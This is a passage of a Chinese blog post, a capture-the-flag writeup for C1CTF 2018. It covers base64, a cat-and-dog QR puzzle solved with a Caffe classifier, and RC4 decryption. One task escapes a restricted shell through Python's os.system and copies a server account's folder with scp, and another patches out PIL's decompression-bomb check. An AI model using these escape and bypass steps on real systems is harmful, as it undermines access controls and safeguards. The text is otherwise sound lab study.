<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 4.2.1">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.ico">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico">
  <link rel="mask-icon" href="/images/favicon.ico" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"rmb122.com","root":"/","scheme":"Mist","version":"8.0.0-rc.2","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":"flat"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="Misc0x01 签到base64 解码一下就行, 不懂的同学可以看一下这个 123$ base64 -d                                     QzFDVEZ7dzNsZWMwbWVfdE9fQzFDVEZ9C1CTF&amp;#123;w3lec0me_tO_C1CTF&amp;#125;">
<meta property="og:type" content="article">
<meta property="og:title" content="C1CTF 2018 Writeup">
<meta property="og:url" content="https://rmb122.com/2018/12/12/c1ctf-2018-writeup/index.html">
<meta property="og:site_name" content="Rmb122&#39;s Notebook">
<meta property="og:description" content="Misc0x01 签到base64 解码一下就行, 不懂的同学可以看一下这个 123$ base64 -d                                     QzFDVEZ7dzNsZWMwbWVfdE9fQzFDVEZ9C1CTF&amp;#123;w3lec0me_tO_C1CTF&amp;#125;">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://i.loli.net/2019/03/08/5c826d05ce0aa.png">
<meta property="og:image" content="https://i.loli.net/2019/03/08/5c826d603e3ac.png">
<meta property="og:image" content="https://i.loli.net/2019/03/08/5c826dfb50be6.png">
<meta property="og:image" content="https://i.loli.net/2019/03/08/5c826e11a3277.png">
<meta property="og:image" content="https://i.loli.net/2019/03/08/5c826e702af72.png">
<meta property="og:image" content="https://i.loli.net/2019/03/08/5c826e89d5c9b.png">
<meta property="og:image" content="https://i.loli.net/2019/03/08/5c826ec9b4061.png">
<meta property="og:image" content="https://i.loli.net/2019/03/08/5c826ef30a8bd.png">
<meta property="og:image" content="https://i.loli.net/2019/03/08/5c826f0a88582.png">
<meta property="article:published_time" content="2018-12-12T13:57:13.000Z">
<meta property="article:modified_time" content="2020-02-29T08:13:12.177Z">
<meta property="article:author" content="rmb122">
<meta property="article:tag" content="writeup">
<meta property="article:tag" content="c1ctf">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://i.loli.net/2019/03/08/5c826d05ce0aa.png">

<link rel="canonical" href="https://rmb122.com/2018/12/12/c1ctf-2018-writeup/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>C1CTF 2018 Writeup | Rmb122's Notebook</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

<link rel="alternate" href="/atom.xml" title="Rmb122's Notebook" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
        <span class="toggle-line toggle-line-first"></span>
        <span class="toggle-line toggle-line-middle"></span>
        <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Rmb122's Notebook</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-links">

    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://rmb122.com/2018/12/12/c1ctf-2018-writeup/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.png">
      <meta itemprop="name" content="rmb122">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Rmb122's Notebook">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          C1CTF 2018 Writeup
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2018-12-12 21:57:13" itemprop="dateCreated datePublished" datetime="2018-12-12T21:57:13+08:00">2018-12-12</time>
            </span>

          
            <span id="/2018/12/12/c1ctf-2018-writeup/" class="post-meta-item leancloud_visitors" data-flag-title="C1CTF 2018 Writeup" title="阅读次数">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">阅读次数：</span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine：</span>
    
    <a title="valine" href="/2018/12/12/c1ctf-2018-writeup/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2018/12/12/c1ctf-2018-writeup/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="0x01-签到"><a href="#0x01-签到" class="headerlink" title="0x01 签到"></a>0x01 签到</h3><p>base64 解码一下就行, 不懂的同学可以看一下<a href="https://www.rmb122.cn/index.php/2018/04/26/base64-%E7%BC%96%E7%A0%81%E5%8E%9F%E7%90%86%E8%AF%A6%E8%A7%A3/" target="_blank" rel="noopener">这个</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ base64 -d                                     </span><br><span class="line">QzFDVEZ7dzNsZWMwbWVfdE9fQzFDVEZ9</span><br><span class="line">C1CTF&#123;w3lec0me_tO_C1CTF&#125;</span><br></pre></td></tr></table></figure>

<a id="more"></a>

<h3 id="0x02-find-the-flag"><a href="#0x02-find-the-flag" class="headerlink" title="0x02 find the flag~"></a>0x02 find the flag~</h3><p>这道题我应该是非预期了 233 我用的是</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ scp -P 8999 -r ssh_bash@212.64.85.131:/home/ssh_bash/ .</span><br></pre></td></tr></table></figure>

<p>直接把整个文件夹给下下来了, 正确做法应该是尝试几个常用命令可以发现有 python, 然后直接用 os.system 就 OK 了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.system(<span class="string">'/bin/ls /home/ssh_bash/'</span>)</span><br><span class="line">bin  c5836008c1649301e29351a55db8f65c</span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.system(<span class="string">'/bin/cat c5836008c1649301e29351a55db8f65c'</span>)</span><br><span class="line">C1CTF&#123;Bash_l1mit3d&#125;</span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure>

<h3 id="0x03-cats-and-dogs"><a href="#0x03-cats-and-dogs" class="headerlink" title="0x03 cats and dogs"></a>0x03 cats and dogs</h3><p>脑洞一下可以想到出题人把二维码中的黑的像素换成狗的图片, 把白的像素换成喵咪的图片. binwalk 出来的 mysql 文件应该是意外…</p>
<p>图片大小 17400x17400, 可以靠神经网络来识别内容, 当然你也可以靠人工来识别, 如果你有足够耐心的话… </p>
<p>先靠 PIL 把图像给切割了, 如果因为图像太大, 遇到 DecompressionBombError, 可以把 PIL 源码改成 pass 就可以了, 报错是不可能报错的, 这辈子都不可能报错的</p>
<p><img src="https://i.loli.net/2019/03/08/5c826d05ce0aa.png" alt=""></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">img = Image.open(<span class="string">'cat&amp;dog.jpg'</span>)</span><br><span class="line"><span class="comment">#region = (0, 0, 200, 200)</span></span><br><span class="line"><span class="comment"># (x0,y0,x1,y1)</span></span><br><span class="line">num = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">87</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">87</span>):</span><br><span class="line">        tmp = (<span class="number">0</span> + x * <span class="number">200</span>, <span class="number">0</span> + y * <span class="number">200</span>, <span class="number">200</span> + x * <span class="number">200</span>, <span class="number">200</span> + y * <span class="number">200</span>)</span><br><span class="line">        part = img.crop(tmp)</span><br><span class="line">        part.save(<span class="string">f'pics/<span class="subst">&#123;num&#125;</span>.png'</span>)</span><br><span class="line">        num += <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>切割完成后考虑的就是识别的问题了. HINT 给了数据集, 可以在 Github 上找现成的, 中间试了好几个模型, 最后找到<a href="https://github.com/mrgloom/kaggle-dogs-vs-cats-solution" target="_blank" rel="noopener">这个</a>, 是 google 之类拿来发论文的模型, 准确率不知道比个人训练的好到哪里去了. 我自己用的 linux, 装起环境来还挺方便, 这里一键装个 Caffe 就行了. 然后改一下示例代码. 用了 SqeezeNet_v1.1 的模型, 然后开跑就 ok</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> usefull_utils</span><br><span class="line"></span><br><span class="line"><span class="comment">#Iterate over all data and get prediction errors</span></span><br><span class="line"></span><br><span class="line">os.environ[<span class="string">'GLOG_minloglevel'</span>] = <span class="string">'2'</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> caffe</span><br><span class="line"></span><br><span class="line"><span class="string">'''if len(sys.argv) != 6:</span></span><br><span class="line"><span class="string">    print "Usage: python get_predition_errors.py deploy.prototxt model.caffemodel mean.npy &lt;cat_data_folder&gt; &lt;dog_data_folder&gt;"</span></span><br><span class="line"><span class="string">    sys.exit()'''</span></span><br><span class="line">    </span><br><span class="line">DEPLOY_PROTOTXT = <span class="string">'kaggle-dogs-vs-cats-solution/demo/SqeezeNet_v1.1/deploy.prototxt'</span> <span class="comment">#deploy.prototxt</span></span><br><span class="line">CAFFE_MODEL = <span class="string">'kaggle-dogs-vs-cats-solution/demo/SqeezeNet_v1.1/model.caffemodel'</span><span class="comment">#model.caffemodel</span></span><br><span class="line">MEAN_FILE = <span class="string">'kaggle-dogs-vs-cats-solution/demo/SqeezeNet_v1.1/mean.npy'</span> <span class="comment">#mean.npy</span></span><br><span class="line">MODEL_POSTFIX= CAFFE_MODEL.split(os.sep)[<span class="number">-2</span>] <span class="comment"># not safe way</span></span><br><span class="line"><span class="string">'''CAT_DATA_FOLDER= sys.argv[4]</span></span><br><span class="line"><span class="string">DOG_DATA_FOLDER= sys.argv[5]'''</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">"MODEL_POSTFIX"</span>, MODEL_POSTFIX)</span><br><span class="line"></span><br><span class="line"><span class="comment">#caffe.set_mode_gpu()</span></span><br><span class="line">net = caffe.Classifier(DEPLOY_PROTOTXT, CAFFE_MODEL,</span><br><span class="line">                       mean=np.load(MEAN_FILE).mean(<span class="number">1</span>).mean(<span class="number">1</span>),</span><br><span class="line">                       channel_swap=(<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>),</span><br><span class="line">                       raw_scale=<span class="number">255</span>,</span><br><span class="line">                       image_dims=(<span class="number">256</span>, <span class="number">256</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">img = Image.new(<span class="string">"L"</span>, (<span class="number">87</span>, <span class="number">87</span>), <span class="number">255</span>)</span><br><span class="line">col = <span class="number">0</span></span><br><span class="line">row = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7569</span>):</span><br><span class="line">    prediction = net.predict([caffe.io.load_image(<span class="string">'pics/'</span> + str(i) + <span class="string">'.png'</span>)])</span><br><span class="line">    print(i, prediction[<span class="number">0</span>].argmax())</span><br><span class="line">    <span class="keyword">if</span> (prediction[<span class="number">0</span>].argmax() == <span class="number">1</span>):</span><br><span class="line">        img.putpixel((col, row), <span class="number">0</span>)</span><br><span class="line">    col += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> col == <span class="number">87</span>:</span><br><span class="line">        img.show()</span><br><span class="line">        row += <span class="number">1</span></span><br><span class="line">        col = <span class="number">0</span></span><br><span class="line">img.save(<span class="string">'out.png'</span>)</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2019/03/08/5c826d603e3ac.png" alt=""></p>
<p>然后你就可以得到这个~</p>
<p>扫一下得到 C1CTF{Do_u_lik3_An1mals?}</p>
<h3 id="0x04-easy-crypto"><a href="#0x04-easy-crypto" class="headerlink" title="0x04 easy_crypto"></a>0x04 easy_crypto</h3><p>1 和 2 比较相似, 就一起说了, 两题都是 RC4, 因为是对称加密, 所以对于第一题 easy_crypto1 只要翻译过来就行了, 我就在网上找了个现成的</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crypt</span><span class="params">(data, key)</span>:</span></span><br><span class="line">    <span class="string">"""RC4 algorithm"""</span></span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    box = [i <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        x = (x + box[i] + ord(key[i % len(key)])) % <span class="number">256</span></span><br><span class="line">        box[i], box[x] = box[x], box[i]</span><br><span class="line">    x = y = <span class="number">0</span></span><br><span class="line">    out = []</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> data:</span><br><span class="line">        x = (x + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        y = (y + box[x]) % <span class="number">256</span></span><br><span class="line">        box[x], box[y] = box[y], box[x]</span><br><span class="line">        out.append(chr(char ^ box[(box[x] + box[y]%<span class="number">256</span>) % <span class="number">256</span>]))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(out)</span><br><span class="line"></span><br><span class="line">data = open(<span class="string">'easy_enc.txt'</span>, <span class="string">'rb'</span>).read()</span><br><span class="line">key = <span class="string">'hello world'</span></span><br><span class="line">data = data.replace(<span class="string">"\r"</span>.encode(), <span class="string">""</span>.encode())</span><br><span class="line">data = crypt(data, key)</span><br><span class="line">print(data)</span><br><span class="line"><span class="comment"># C1ctf&#123;5ca4a10ca6de1639674a822cc93c81fb&#125;</span></span><br></pre></td></tr></table></figure>

<p>注意 data.replace(“\r”.encode(), “”.encode()), 出题人用的 windows 保存的时候忘了用 wb 模式了, 所以把 CRLF 给一起保存进去了, 所以 \r 会乱码, 把 \r 替换掉就 ok</p>
<p>第二题, 出题人把 key 加密了一下, 我们取一段来看看 <code>_____*((__//__+___+______-____%____)**</code> 可以猜出来 _ 的数量对应数字, 这整个 key 其实是个表达式. 写个脚本解密一下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">key = <span class="string">"_____*((__//__+___+______-____%____)**((___%(___-_))+________+(___%___+_____+_______%__+______-(______//(_____%___)))))+__*(((________/__)+___%__+_______-(________//____))**(_*(_____+_____)+_______+_________%___))+________*(((_________//__+________%__)+(_______-_))**((___+_______)+_________-(______//__)))+_______*((___+_________-(______//___-_______%__%_))**(_____+_____+_____))+__*(__+_________-(___//___-_________%_____%__))**(_________-____+_______)+(___+_______)**(________%___%__+_____+______)+(_____-__)*((____//____-_____%____%_)+_________)**(_____-(_______//_______+_________%___)+______)+(_____+(_________%_______)\*__+_)\*\*_________+_______*(((_________%_______)\*__+_______-(________//________))\*\*_______)+(________/__)*(((____-_+_______)*(______+____))\*\*___)+___\*((__+_________-_)\*\*_____)+___\*(((___+_______-______/___+__-_________%_____%__)*(___-_+________/__+_________%_____))\*\*__)+(_//_)\*(((________%___%__+_____+_____)%______)+_______-_)\*\*___+_____\*((______/(_____%___))+_______)*((_________%_______)*__+_____+_)+___//___+_________+_________/___"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>, <span class="number">0</span>, <span class="number">-1</span>):</span><br><span class="line">    key = key.replace(<span class="string">"_"</span> * i, str(i))</span><br><span class="line">print(key)</span><br><span class="line">key = int(eval(key))</span><br><span class="line">print(key)</span><br><span class="line">key = hex(key)</span><br><span class="line">print(base64.b16decode(key[<span class="number">2</span>:].upper()))</span><br><span class="line"></span><br><span class="line">$ python2 crypto1/rep.py <span class="comment"># 注意这里得用 python2, 3的话会自动转浮点, 精度会丢失</span></span><br><span class="line"><span class="number">5</span>((<span class="number">2</span>//<span class="number">2</span>+<span class="number">3</span>+<span class="number">6</span><span class="number">-4</span>%<span class="number">4</span>)((<span class="number">3</span>%(<span class="number">3</span><span class="number">-1</span>))+<span class="number">8</span>+(<span class="number">3</span>%<span class="number">3</span>+<span class="number">5</span>+<span class="number">7</span>%<span class="number">2</span>+<span class="number">6</span>-(<span class="number">6</span>//(<span class="number">5</span>%<span class="number">3</span>)))))+<span class="number">2</span>(((<span class="number">8</span>/<span class="number">2</span>)+<span class="number">3</span>%<span class="number">2</span>+<span class="number">7</span>-(<span class="number">8</span>//<span class="number">4</span>))(<span class="number">1</span>(<span class="number">5</span>+<span class="number">5</span>)+<span class="number">7</span>+<span class="number">9</span>%<span class="number">3</span>))+<span class="number">8</span>(((<span class="number">9</span>//<span class="number">2</span>+<span class="number">8</span>%<span class="number">2</span>)+(<span class="number">7</span><span class="number">-1</span>))((<span class="number">3</span>+<span class="number">7</span>)+<span class="number">9</span>-(<span class="number">6</span>//<span class="number">2</span>)))+<span class="number">7</span>((<span class="number">3</span>+<span class="number">9</span>-(<span class="number">6</span>//<span class="number">3</span><span class="number">-7</span>%<span class="number">2</span>%<span class="number">1</span>))(<span class="number">5</span>+<span class="number">5</span>+<span class="number">5</span>))+<span class="number">2</span>(<span class="number">2</span>+<span class="number">9</span>-(<span class="number">3</span>//<span class="number">3</span><span class="number">-9</span>%<span class="number">5</span>%<span class="number">2</span>))(<span class="number">9</span><span class="number">-4</span>+<span class="number">7</span>)+(<span class="number">3</span>+<span class="number">7</span>)(<span class="number">8</span>%<span class="number">3</span>%<span class="number">2</span>+<span class="number">5</span>+<span class="number">6</span>)+(<span class="number">5</span><span class="number">-2</span>)((<span class="number">4</span>//<span class="number">4</span><span class="number">-5</span>%<span class="number">4</span>%<span class="number">1</span>)+<span class="number">9</span>)(<span class="number">5</span>-(<span class="number">7</span>//<span class="number">7</span>+<span class="number">9</span>%<span class="number">3</span>)+<span class="number">6</span>)+(<span class="number">5</span>+(<span class="number">9</span>%<span class="number">7</span>)<span class="number">2</span>+<span class="number">1</span>)<span class="number">9</span>+<span class="number">7</span>(((<span class="number">9</span>%<span class="number">7</span>)<span class="number">2</span>+<span class="number">7</span>-(<span class="number">8</span>//<span class="number">8</span>))<span class="number">7</span>)+(<span class="number">8</span>/<span class="number">2</span>)(((<span class="number">4</span><span class="number">-1</span>+<span class="number">7</span>)(<span class="number">6</span>+<span class="number">4</span>))<span class="number">3</span>)+<span class="number">3</span>((<span class="number">2</span>+<span class="number">9</span><span class="number">-1</span>)<span class="number">5</span>)+<span class="number">3</span>(((<span class="number">3</span>+<span class="number">7</span><span class="number">-6</span>/<span class="number">3</span>+<span class="number">2</span><span class="number">-9</span>%<span class="number">5</span>%<span class="number">2</span>)(<span class="number">3</span><span class="number">-1</span>+<span class="number">8</span>/<span class="number">2</span>+<span class="number">9</span>%<span class="number">5</span>))<span class="number">2</span>)+(<span class="number">1</span>//<span class="number">1</span>)(((<span class="number">8</span>%<span class="number">3</span>%<span class="number">2</span>+<span class="number">5</span>+<span class="number">5</span>)%<span class="number">6</span>)+<span class="number">7</span><span class="number">-1</span>)*<span class="number">3</span>+<span class="number">5</span>((<span class="number">6</span>/(<span class="number">5</span>%<span class="number">3</span>))+<span class="number">7</span>)((<span class="number">9</span>%<span class="number">7</span>)<span class="number">2</span>+<span class="number">5</span>+<span class="number">1</span>)+<span class="number">3</span>//<span class="number">3</span>+<span class="number">9</span>+<span class="number">9</span>/<span class="number">3</span></span><br><span class="line"><span class="number">5287002131074331513</span></span><br><span class="line">I_4m-k3y</span><br></pre></td></tr></table></figure>

<p>I_4m-k3y 就是 key 了, 然后又找到一个现成的脚本, 解密一下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crypt</span><span class="params">(data, key)</span>:</span></span><br><span class="line">    <span class="string">"""RC4 algorithm"""</span></span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    box = range(<span class="number">256</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        x = (x + box[i] + ord(key[i % len(key)])) % <span class="number">256</span></span><br><span class="line">        box[i], box[x] = box[x], box[i]</span><br><span class="line">    x = y = <span class="number">0</span></span><br><span class="line">    out = []</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> data:</span><br><span class="line">        x = (x + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        y = (y + box[x]) % <span class="number">256</span></span><br><span class="line">        box[x], box[y] = box[y], box[x]</span><br><span class="line">        out.append(chr(ord(char) ^ box[(box[x] + box[y]) % <span class="number">256</span>]))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(out)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tencode</span><span class="params">(data, key, encode=base64.b64encode, salt_length=<span class="number">16</span>)</span>:</span></span><br><span class="line">    <span class="string">"""RC4 encryption with random salt and final encoding"""</span></span><br><span class="line">    salt = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> range(salt_length):</span><br><span class="line">        salt += chr(random.randrange(<span class="number">256</span>))</span><br><span class="line">    data = salt + crypt(data, sha1(key + salt).digest())</span><br><span class="line">    <span class="keyword">if</span> encode:</span><br><span class="line">        data = encode(data)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tdecode</span><span class="params">(data, key, decode=base64.b64decode, salt_length=<span class="number">16</span>)</span>:</span></span><br><span class="line">    <span class="string">"""RC4 decryption of encoded data"""</span></span><br><span class="line">    <span class="keyword">if</span> decode:</span><br><span class="line">        data = decode(data)</span><br><span class="line">    salt = data[:salt_length]</span><br><span class="line">    <span class="keyword">return</span> 